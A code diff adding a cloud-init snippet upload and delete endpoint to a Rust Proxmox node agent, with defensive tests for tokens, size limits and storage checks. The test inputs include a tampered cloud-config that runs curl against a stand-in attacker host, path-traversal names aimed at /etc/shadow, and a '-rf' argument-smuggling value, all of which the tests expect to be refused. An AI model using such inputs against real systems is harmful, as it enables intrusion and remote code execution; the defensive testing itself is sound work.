@@ -1,4 +1,5 @@
 mod artifacts;
+mod snippets;
 
 use std::sync::Arc;
 
@@ -7,7 +8,7 @@ use axum::{
     extract::{Path, State, WebSocketUpgrade, ws::WebSocket},
     http::{HeaderMap, StatusCode},
     response::{IntoResponse, Response},
-    routing::{get, post},
+    routing::{get, post, put},
 };
 use serde::Serialize;
 use tower_http::{request_id::MakeRequestUuid, trace::TraceLayer};
@@ -66,14 +67,23 @@ pub const EXPORT_CAPABILITY: &str = "migration.export";
 /// that cannot be started. The panel must be able to tell those agents apart
 /// before it moves anyone's machine, and a missing capability is how.
 pub const MIGRATION_INSTALL_CAPABILITY: &str = "migration.install";
+/// This node can write the cloud-init snippets that carry a server's
+/// provisioner scripts. The panel will not build a server with provisioners on
+/// a node that does not say so, because Proxmox would have nowhere to read
+/// them from.
+pub const SNIPPETS_CAPABILITY: &str = "provisioning.snippets";
 pub const RELAY_CAPABILITIES: &[&str] = &["console.relay"];
 
 /// What this installation can actually do.
 ///
 /// Templates are advertised only when the agent is configured to install them,
 /// so the panel can leave a node out of an import rather than queueing work
-/// that is going to be refused.
-fn capabilities(config: &Config) -> Vec<&'static str> {
+/// that is going to be refused. Snippets likewise, and independently: writing
+/// a small file is a different grant from restoring a guest image.
+///
+/// `/api/v1/info` and the heartbeat both answer from here, because the panel
+/// records whichever it heard from last.
+pub(crate) fn capabilities(config: &Config) -> Vec<&'static str> {
     match config.mode {
         Mode::Relay => RELAY_CAPABILITIES.to_vec(),
         Mode::Agent => {
@@ -87,6 +97,9 @@ fn capabilities(config: &Config) -> Vec<&'static str> {
                 if config.agent.exports_enabled {
                     capabilities.push(EXPORT_CAPABILITY);
                 }
+            }
+            if config.agent.snippets_enabled {
+                capabilities.push(SNIPPETS_CAPABILITY);
             }
             capabilities
         }
@@ -138,6 +151,10 @@ pub fn build(config: Arc<Config>) -> (Router, Jobs) {
         .route(
             "/artifacts/{artifact}",
             get(artifacts::download).delete(artifacts::discard),
+        )
+        .route(
+            "/api/v1/snippets/{name}",
+            put(snippets::write).delete(snippets::delete),
         )
         .with_state(AppState {
             config,
@@ -1212,5 +1229,684 @@ mod tests {
 
         let status = status_of(router, fetch(&id, &id, None)).await;
         assert_eq!(status, StatusCode::NOT_FOUND);
+    }
+
+    const SNIPPET: &str = "convoy-provisioner-0b7e5b52-7f2c-4b8f-9b1e-3f6f0d6e2a11.yaml";
+    const CLOUD_CONFIG: &[u8] = b"#cloud-config\nruncmd:\n  - [/bin/true]\n";
+
+    /// A node with a stand-in `pvesm` and its storages laid out under a scratch
+    /// directory, the way Proxmox lays them out under `/var/lib/vz` and
+    /// `/mnt/pve`:
+    ///
+    /// - `local`: active, its snippets directory not yet created
+    /// - `nfs-share`: listed but inactive, as an unmounted share is
+    /// - `retired`: listed but disabled
+    /// - `ghost`: active, but its root is not there
+    /// - `elsewhere`, `renamed`, `climber`: active, but resolving a snippet
+    ///   outside a snippets directory, to another file, or through `..`
+    ///
+    /// `local-lvm` and anything else are absent, which is how `pvesm` reports a
+    /// storage without the `snippets` content type.
+    struct SnippetNode {
+        _dir: tempfile::TempDir,
+        storage: std::path::PathBuf,
+        router: Router,
+    }
+
+    impl SnippetNode {
+        fn new() -> Self {
+            Self::with(|_| {})
+        }
+
+        fn with(adjust: impl FnOnce(&mut Config)) -> Self {
+            use std::os::unix::fs::PermissionsExt;
+
+            let dir = tempfile::tempdir().unwrap();
+            let storage = dir.path().join("storage");
+            for root in ["local", "elsewhere", "renamed/snippets", "climber"] {
+                std::fs::create_dir_all(storage.join(root)).unwrap();
+            }
+
+            let pvesm = dir.path().join("pvesm");
+            std::fs::write(
+                &pvesm,
+                format!(
+                    r#"#!/bin/sh
+root='{root}'
+case "$1" in
+status)
+  if [ "$2" != "--content" ] || [ "$3" != "snippets" ]; then
+    echo "unexpected arguments: $*" >&2
+    exit 2
+  fi
+  echo 'Name             Type     Status           Total            Used       Available        %'
+  echo 'climber           dir     active        98497780        12345678        81234567   12.53%'
+  echo 'elsewhere         dir     active        98497780        12345678        81234567   12.53%'
+  echo 'ghost             dir     active        98497780        12345678        81234567   12.53%'
+  echo 'local             dir     active        98497780        12345678        81234567   12.53%'
+  echo 'nfs-share         nfs   inactive               0               0               0    0.00%'
+  echo 'renamed           dir     active        98497780        12345678        81234567   12.53%'
+  echo 'retired           dir   disabled               0               0               0      N/A'
+  ;;
+path)
+  storage="${{2%%:*}}"
+  name="${{2#*:snippets/}}"
+  case "$storage" in
+  elsewhere) echo "$root/elsewhere/$name" ;;
+  renamed) echo "$root/renamed/snippets/convoy-someone-else.yaml" ;;
+  climber) echo "$root/climber/snippets/../../local/snippets/$name" ;;
+  *) echo "$root/$storage/snippets/$name" ;;
+  esac
+  ;;
+*)
+  echo "unexpected command: $1" >&2
+  exit 2
+  ;;
+esac
+"#,
+                    root = storage.display(),
+                ),
+            )
+            .unwrap();
+            std::fs::set_permissions(&pvesm, std::fs::Permissions::from_mode(0o755)).unwrap();
+
+            let mut config = config(Mode::Agent);
+            config.agent.pvesm_path = pvesm.display().to_string();
+            adjust(&mut config);
+
+            Self {
+                router: router(config),
+                storage,
+                _dir: dir,
+            }
+        }
+
+        fn local_snippet(&self) -> std::path::PathBuf {
+            self.storage.join("local/snippets").join(SNIPPET)
+        }
+
+        /// Every file under the storages, so a refusal can be shown to have
+        /// written nothing anywhere.
+        fn files(&self) -> Vec<std::path::PathBuf> {
+            fn walk(dir: &std::path::Path, found: &mut Vec<std::path::PathBuf>) {
+                for entry in std::fs::read_dir(dir).unwrap() {
+                    let path = entry.unwrap().path();
+                    if path.is_dir() {
+                        walk(&path, found);
+                    } else {
+                        found.push(path);
+                    }
+                }
+            }
+
+            let mut found = Vec::new();
+            walk(&self.storage, &mut found);
+            found
+        }
+
+        async fn send(&self, request: Request<Body>) -> Response {
+            self.router.clone().oneshot(request).await.unwrap()
+        }
+
+        async fn status(&self, request: Request<Body>) -> StatusCode {
+            self.send(request).await.status()
+        }
+    }
+
+    /// Mint a snippet token the way the panel does.
+    fn snippet_token(snippet: serde_json::Value, audience: &str) -> String {
+        let claims = json!({
+            "iss": "https://panel.example.com",
+            "sub": "panel",
+            "aud": audience,
+            "exp": now() + 60,
+            "iat": now(),
+            "jti": "snippet_1",
+            "protocol": PROTOCOL_MAX,
+            "snippet": snippet,
+        });
+
+        encode(
+            &Header::default(),
+            &claims,
+            &EncodingKey::from_secret(SECRET.as_bytes()),
+        )
+        .unwrap()
+    }
+
+    fn write_claim(storage: &str, name: &str, body: &[u8]) -> serde_json::Value {
+        json!({
+            "action": "write",
+            "storage": storage,
+            "name": name,
+            "sha256": hex::encode(Sha256::digest(body)),
+        })
+    }
+
+    fn delete_claim(storage: &str, name: &str) -> serde_json::Value {
+        json!({ "action": "delete", "storage": storage, "name": name })
+    }
+
+    /// `name` is the path segment as sent, so it may be percent-encoded.
+    fn put_snippet(name: &str, token: Option<String>, body: Vec<u8>) -> Request<Body> {
+        let mut request = Request::put(format!("/api/v1/snippets/{name}"));
+        if let Some(token) = token {
+            request = request.header("authorization", format!("Bearer {token}"));
+        }
+
+        request.body(Body::from(body)).unwrap()
+    }
+
+    fn delete_snippet(name: &str, token: Option<String>) -> Request<Body> {
+        let mut request = Request::delete(format!("/api/v1/snippets/{name}"));
+        if let Some(token) = token {
+            request = request.header("authorization", format!("Bearer {token}"));
+        }
+
+        request.body(Body::empty()).unwrap()
+    }
+
+    /// The ordinary write: the right token for the right name and body.
+    fn local_write() -> Request<Body> {
+        put_snippet(
+            SNIPPET,
+            Some(snippet_token(
+                write_claim("local", SNIPPET, CLOUD_CONFIG),
+                "anchor_1",
+            )),
+            CLOUD_CONFIG.to_vec(),
+        )
+    }
+
+    fn local_delete() -> Request<Body> {
+        delete_snippet(
+            SNIPPET,
+            Some(snippet_token(delete_claim("local", SNIPPET), "anchor_1")),
+        )
+    }
+
+    async fn json_of(response: Response) -> serde_json::Value {
+        serde_json::from_slice(&body_of(response).await).unwrap()
+    }
+
+    async fn capabilities_of(config: Config) -> Vec<serde_json::Value> {
+        let response = router(config)
+            .oneshot(Request::get("/api/v1/info").body(Body::empty()).unwrap())
+            .await
+            .unwrap();
+
+        json_of(response).await["capabilities"]
+            .as_array()
+            .unwrap()
+            .clone()
+    }
+
+    #[tokio::test]
+    async fn advertises_the_snippets_capability() {
+        let capabilities = capabilities_of(config(Mode::Agent)).await;
+
+        assert!(capabilities.contains(&json!(SNIPPETS_CAPABILITY)));
+    }
+
+    #[tokio::test]
+    async fn hides_the_snippets_capability_when_it_is_switched_off() {
+        let mut config = config(Mode::Agent);
+        config.agent.snippets_enabled = false;
+
+        let capabilities = capabilities_of(config).await;
+
+        assert!(!capabilities.contains(&json!(SNIPPETS_CAPABILITY)));
+        // Nothing else rides on it.
+        assert!(capabilities.contains(&json!(TEMPLATE_CAPABILITY)));
+    }
+
+    /// Writing a small file is a different grant from restoring an image, so
+    /// switching templates off leaves snippets alone.
+    #[tokio::test]
+    async fn the_snippets_capability_does_not_ride_on_templates() {
+        let mut config = config(Mode::Agent);
+        config.agent.templates_enabled = false;
+
+        let capabilities = capabilities_of(config).await;
+
+        assert!(capabilities.contains(&json!(SNIPPETS_CAPABILITY)));
+    }
+
+    #[tokio::test]
+    async fn a_relay_does_not_advertise_snippets() {
+        let capabilities = capabilities_of(config(Mode::Relay)).await;
+
+        assert!(!capabilities.contains(&json!(SNIPPETS_CAPABILITY)));
+    }
+
+    #[tokio::test]
+    async fn snippet_writes_require_a_bearer_token() {
+        let node = SnippetNode::new();
+
+        let status = node
+            .status(put_snippet(SNIPPET, None, CLOUD_CONFIG.to_vec()))
+            .await;
+
+        assert_eq!(status, StatusCode::UNAUTHORIZED);
+        assert!(node.files().is_empty());
+    }
+
+    #[tokio::test]
+    async fn snippet_deletes_require_a_bearer_token() {
+        let node = SnippetNode::new();
+
+        let status = node.status(delete_snippet(SNIPPET, None)).await;
+
+        assert_eq!(status, StatusCode::UNAUTHORIZED);
+    }
+
+    #[tokio::test]
+    async fn a_snippet_token_for_another_anchor_is_refused() {
+        let node = SnippetNode::new();
+
+        let status = node
+            .status(put_snippet(
+                SNIPPET,
+                Some(snippet_token(
+                    write_claim("local", SNIPPET, CLOUD_CONFIG),
+                    "anchor_2",
+                )),
+                CLOUD_CONFIG.to_vec(),
+            ))
+            .await;
+
+        assert_eq!(status, StatusCode::UNAUTHORIZED);
+        assert!(node.files().is_empty());
+    }
+
+    /// Same secret, same audience, wrong claim set.
+    #[tokio::test]
+    async fn a_template_token_cannot_write_a_snippet() {
+        let node = SnippetNode::new();
+
+        let status = node
+            .status(put_snippet(
+                SNIPPET,
+                Some(token(install_claim(), "anchor_1")),
+                CLOUD_CONFIG.to_vec(),
+            ))
+            .await;
+
+        assert_eq!(status, StatusCode::UNAUTHORIZED);
+        assert!(node.files().is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_delete_token_cannot_write() {
+        let node = SnippetNode::new();
+
+        let status = node
+            .status(put_snippet(
+                SNIPPET,
+                Some(snippet_token(delete_claim("local", SNIPPET), "anchor_1")),
+                CLOUD_CONFIG.to_vec(),
+            ))
+            .await;
+
+        assert_eq!(status, StatusCode::UNAUTHORIZED);
+        assert!(node.files().is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_write_token_cannot_delete() {
+        let node = SnippetNode::new();
+        assert_eq!(node.status(local_write()).await, StatusCode::OK);
+
+        let status = node
+            .status(delete_snippet(
+                SNIPPET,
+                Some(snippet_token(
+                    write_claim("local", SNIPPET, CLOUD_CONFIG),
+                    "anchor_1",
+                )),
+            ))
+            .await;
+
+        assert_eq!(status, StatusCode::UNAUTHORIZED);
+        assert!(node.local_snippet().exists());
+    }
+
+    /// A token for one server's snippet cannot be replayed at another's.
+    #[tokio::test]
+    async fn a_token_for_one_snippet_cannot_write_another() {
+        let node = SnippetNode::new();
+        let other = "convoy-provisioner-someone-else.yaml";
+
+        let status = node
+            .status(put_snippet(
+                other,
+                Some(snippet_token(
+                    write_claim("local", SNIPPET, CLOUD_CONFIG),
+                    "anchor_1",
+                )),
+                CLOUD_CONFIG.to_vec(),
+            ))
+            .await;
+        assert_eq!(status, StatusCode::UNAUTHORIZED);
+
+        let status = node
+            .status(delete_snippet(
+                other,
+                Some(snippet_token(delete_claim("local", SNIPPET), "anchor_1")),
+            ))
+            .await;
+        assert_eq!(status, StatusCode::UNAUTHORIZED);
+
+        assert!(node.files().is_empty());
+    }
+
+    /// Validly signed, matching the path, and still refused: Anchor only ever
+    /// touches files the panel named `convoy-*.yaml`.
+    #[tokio::test]
+    async fn refuses_a_name_outside_anchors_namespace() {
+        let node = SnippetNode::new();
+
+        for encoded in [
+            "foo.yaml",
+            "convoy-x.yml",
+            "convoy-X.yaml",
+            "convoy-.yaml",
+            "convoy-x.yaml.bak",
+            ".convoy-x.yaml",
+            "..%2Fx.yaml",
+            "..%2F..%2Fetc%2Fsnippets%2Fconvoy-x.yaml",
+            "convoy-..%2F..%2Fx.yaml",
+            "%2Fetc%2Fshadow",
+        ] {
+            let name = percent_decode(encoded);
+            for request in [
+                put_snippet(
+                    encoded,
+                    Some(snippet_token(
+                        write_claim("local", &name, CLOUD_CONFIG),
+                        "anchor_1",
+                    )),
+                    CLOUD_CONFIG.to_vec(),
+                ),
+                delete_snippet(
+                    encoded,
+                    Some(snippet_token(delete_claim("local", &name), "anchor_1")),
+                ),
+            ] {
+                let response = node.send(request).await;
+                let status = response.status();
+                assert_eq!(
+                    status,
+                    StatusCode::BAD_REQUEST,
+                    "{encoded} returned {status}"
+                );
+                assert!(json_of(response).await["error"].is_string());
+            }
+        }
+
+        assert!(node.files().is_empty());
+    }
+
+    /// A traversal that is not encoded never reaches the handler at all.
+    #[tokio::test]
+    async fn an_unencoded_traversal_reaches_nothing() {
+        let node = SnippetNode::new();
+
+        let status = node
+            .status(put_snippet(
+                "../x.yaml",
+                Some(snippet_token(
+                    write_claim("local", "../x.yaml", CLOUD_CONFIG),
+                    "anchor_1",
+                )),
+                CLOUD_CONFIG.to_vec(),
+            ))
+            .await;
+
+        assert!(!status.is_success(), "returned {status}");
+        assert!(node.files().is_empty());
+    }
+
+    #[tokio::test]
+    async fn refuses_a_body_that_is_not_the_one_the_token_was_minted_for() {
+        let node = SnippetNode::new();
+
+        let response = node
+            .send(put_snippet(
+                SNIPPET,
+                Some(snippet_token(
+                    write_claim("local", SNIPPET, CLOUD_CONFIG),
+                    "anchor_1",
+                )),
+                b"#cloud-config\nruncmd:\n  - [curl, evil.example]\n".to_vec(),
+            ))
+            .await;
+
+        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
+        assert!(
+            json_of(response).await["error"]
+                .as_str()
+                .unwrap()
+                .contains("sha256")
+        );
+        assert!(node.files().is_empty());
+    }
+
+    #[tokio::test]
+    async fn refuses_a_body_over_the_limit() {
+        let node = SnippetNode::new();
+        let body = vec![b'#'; crate::snippets::MAX_SNIPPET_BYTES + 1];
+
+        let status = node
+            .status(put_snippet(
+                SNIPPET,
+                Some(snippet_token(
+                    write_claim("local", SNIPPET, &body),
+                    "anchor_1",
+                )),
+                body,
+            ))
+            .await;
+
+        assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
+        assert!(node.files().is_empty());
+    }
+
+    /// Refused on the header alone, before any of the body is read.
+    #[tokio::test]
+    async fn refuses_a_declared_length_over_the_limit() {
+        let node = SnippetNode::new();
+        let token = snippet_token(write_claim("local", SNIPPET, CLOUD_CONFIG), "anchor_1");
+
+        let status = node
+            .status(
+                Request::put(format!("/api/v1/snippets/{SNIPPET}"))
+                    .header("authorization", format!("Bearer {token}"))
+                    .header(
+                        "content-length",
+                        (crate::snippets::MAX_SNIPPET_BYTES + 1).to_string(),
+                    )
+                    .body(Body::from(CLOUD_CONFIG))
+                    .unwrap(),
+            )
+            .await;
+
+        assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
+    }
+
+    /// "At most 1 MiB" includes 1 MiB.
+    #[tokio::test]
+    async fn accepts_a_body_exactly_at_the_limit() {
+        let node = SnippetNode::new();
+        let body = vec![b'#'; crate::snippets::MAX_SNIPPET_BYTES];
+
+        let response = node
+            .send(put_snippet(
+                SNIPPET,
+                Some(snippet_token(
+                    write_claim("local", SNIPPET, &body),
+                    "anchor_1",
+                )),
+                body,
+            ))
+            .await;
+
+        assert_eq!(response.status(), StatusCode::OK);
+        assert_eq!(
+            json_of(response).await["size"],
+            crate::snippets::MAX_SNIPPET_BYTES
+        );
+    }
+
+    #[tokio::test]
+    async fn snippets_are_refused_when_they_are_disabled() {
+        let node = SnippetNode::with(|config| config.agent.snippets_enabled = false);
+
+        assert_eq!(node.status(local_write()).await, StatusCode::CONFLICT);
+        assert_eq!(node.status(local_delete()).await, StatusCode::CONFLICT);
+        assert!(node.files().is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_relay_refuses_snippet_work() {
+        let status = status_of(router(config(Mode::Relay)), local_write()).await;
+
+        assert_eq!(status, StatusCode::BAD_REQUEST);
+    }
+
+    /// Every way a storage can fail to be somewhere a snippet belongs is a
+    /// conflict the panel can show an admin, and none of them writes anything.
+    #[tokio::test]
+    async fn a_storage_that_cannot_hold_snippets_is_a_conflict() {
+        let node = SnippetNode::new();
+
+        for storage in [
+            // Not a storage id at all.
+            "-rf",
+            "local:x",
+            "local/..",
+            // Not listed: no `snippets` content type, or no such storage.
+            "local-lvm",
+            // Listed, but not somewhere Proxmox is reading from.
+            "nfs-share",
+            "retired",
+            // Active, but its root has gone.
+            "ghost",
+            // Active, but resolving the file somewhere it does not belong.
+            "elsewhere",
+            "renamed",
+            "climber",
+        ] {
+            for request in [
+                put_snippet(
+                    SNIPPET,
+                    Some(snippet_token(
+                        write_claim(storage, SNIPPET, CLOUD_CONFIG),
+                        "anchor_1",
+                    )),
+                    CLOUD_CONFIG.to_vec(),
+                ),
+                delete_snippet(
+                    SNIPPET,
+                    Some(snippet_token(delete_claim(storage, SNIPPET), "anchor_1")),
+                ),
+            ] {
+                let response = node.send(request).await;
+                let status = response.status();
+                assert_eq!(status, StatusCode::CONFLICT, "{storage} returned {status}");
+                assert!(json_of(response).await["error"].is_string());
+            }
+        }
+
+        assert!(node.files().is_empty());
+        assert!(!node.storage.join("ghost").exists());
+    }
+
+    /// The whole lifecycle the panel drives: write, then delete, then delete
+    /// again as a retried cleanup would.
+    #[tokio::test]
+    async fn writes_a_snippet_then_deletes_it() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let node = SnippetNode::new();
+
+        let response = node.send(local_write()).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        assert_eq!(
+            json_of(response).await,
+            json!({
+                "volume": format!("local:snippets/{SNIPPET}"),
+                "sha256": hex::encode(Sha256::digest(CLOUD_CONFIG)),
+                "size": CLOUD_CONFIG.len(),
+            })
+        );
+
+        let path = node.local_snippet();
+        assert_eq!(std::fs::read(&path).unwrap(), CLOUD_CONFIG);
+        assert_eq!(
+            std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
+            0o600
+        );
+        // The temporary it was written through is gone.
+        assert_eq!(node.files(), std::slice::from_ref(&path));
+
+        let response = node.send(local_delete()).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        assert_eq!(json_of(response).await, json!({ "deleted": true }));
+        assert!(!path.exists());
+
+        let response = node.send(local_delete()).await;
+        assert_eq!(response.status(), StatusCode::OK);
+        assert_eq!(json_of(response).await, json!({ "deleted": false }));
+    }
+
+    #[tokio::test]
+    async fn deleting_a_snippet_that_was_never_written_succeeds() {
+        let node = SnippetNode::new();
+
+        let response = node.send(local_delete()).await;
+
+        assert_eq!(response.status(), StatusCode::OK);
+        assert_eq!(json_of(response).await, json!({ "deleted": false }));
+    }
+
+    #[tokio::test]
+    async fn a_second_write_replaces_the_first() {
+        let node = SnippetNode::new();
+        assert_eq!(node.status(local_write()).await, StatusCode::OK);
+
+        let replacement = b"#cloud-config\npackage_upgrade: true\n";
+        let status = node
+            .status(put_snippet(
+                SNIPPET,
+                Some(snippet_token(
+                    write_claim("local", SNIPPET, replacement),
+                    "anchor_1",
+                )),
+                replacement.to_vec(),
+            ))
+            .await;
+
+        assert_eq!(status, StatusCode::OK);
+        assert_eq!(std::fs::read(node.local_snippet()).unwrap(), replacement);
+        assert_eq!(node.files().len(), 1);
+    }
+
+    /// A node whose `pvesm` cannot run is broken, not the request: a 500, with
+    /// the detail left in Anchor's log rather than handed to the caller.
+    #[tokio::test]
+    async fn a_missing_pvesm_is_the_nodes_fault() {
+        let node = SnippetNode::with(|config| {
+            config.agent.pvesm_path = "/nonexistent/pvesm".into();
+        });
+
+        let response = node.send(local_write()).await;
+
+        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+        assert_eq!(
+            json_of(response).await["error"],
+            "Anchor could not complete this request"
+        );
+        assert!(node.files().is_empty());
     }
 }
